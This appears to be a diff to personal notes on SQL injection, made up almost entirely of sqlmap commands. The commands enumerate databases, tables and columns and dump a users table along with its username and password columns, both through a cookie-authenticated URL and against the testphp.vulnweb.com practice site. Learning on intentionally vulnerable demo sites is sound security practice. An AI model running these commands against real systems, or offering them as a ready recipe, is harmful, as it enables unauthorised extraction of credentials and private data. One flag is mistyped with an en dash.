@@ -18,3 +18,14 @@ inspect document.cookie
 sqlmap -u "URL" --cookie="cooke value" --dbs
 sqlmap -u "URL" --cookie="cooke value" -D databasename --tables
 sqlmap -u "URL" --cookie="cooke value" -D databasename -T table name --dump
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs   (databases)
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –tables   (tables)
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns   (columns)
+(dump whole table)
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users  --dump 
+ OR 
+(dump individual  column data)
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname  --dump 
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass  --dump
+ 
